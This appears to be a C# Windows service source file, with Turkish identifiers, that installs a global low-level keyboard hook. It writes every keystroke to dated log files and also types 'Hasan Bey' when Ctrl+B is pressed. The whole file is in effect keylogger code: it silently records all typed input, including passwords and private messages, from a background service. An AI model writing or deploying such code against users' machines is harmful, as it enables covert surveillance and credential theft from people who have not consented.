using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TestService
{
    public partial class Service1 : ServiceBase
    {
        private delegate int KeyboardHookProc(int code, int wParam, ref KeyboardHookStruct lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHookProc callback, IntPtr hInstance, uint threadId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("user32.dll")]
        private static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref KeyboardHookStruct lParam);

        public   IntPtr _hook;

        private struct KeyboardHookStruct
        {
            public int VkCode;
            public int ScanCode;
            public int Flags;
            public int Time;
            public int DwExtraInfo;
        }
        public Service1()
        {
            InitializeComponent();
            var hInstance = LoadLibrary("User32");
            _hook = SetWindowsHookEx(13, HookProc, hInstance, 0);
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                Logla("TEST", "cem" + Environment.NewLine);
                var hInstance = LoadLibrary("User32");
                _hook = SetWindowsHookEx(13, HookProc, hInstance, 0);
            }
            catch (Exception)
            {
                 
            }
        }

        protected override void OnStop()
        {
        }
        Keys _OncekiKey;
        private int HookProc(int code, int wParam, ref KeyboardHookStruct lParam)
        {
            if (code >= 0 && lParam.Flags == 0)
            {
                var key = (Keys)lParam.VkCode;
                //textBox1.Text += key.ToString() + "" + Environment.NewLine;
                Logla("TEST", key.ToString() + Environment.NewLine);
                if (key == Keys.B && _OncekiKey == Keys.LControlKey)
                {
                    SendKeys.Send("Hasan Bey");

                }
                _OncekiKey = key;
            }
            return CallNextHookEx(_hook, code, wParam, ref lParam);
        }
        private void Logla(string cinsi, string kayit)
        {
            try
            {
                if (!Directory.Exists("Loglar")) Directory.CreateDirectory("Loglar");
                var dosyaAdi = ($"{Application.StartupPath}\\Loglar\\{cinsi} - {DateTime.Now.ToString("yyyyMMdd")}.txt");
                using (var yazici = new StreamWriter(dosyaAdi, true))
                {
                    yazici.Write($"{Environment.NewLine}{kayit}");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Loglayıcı bile hata verdi:{ex.ToString()}");
            }
        }
    }
}
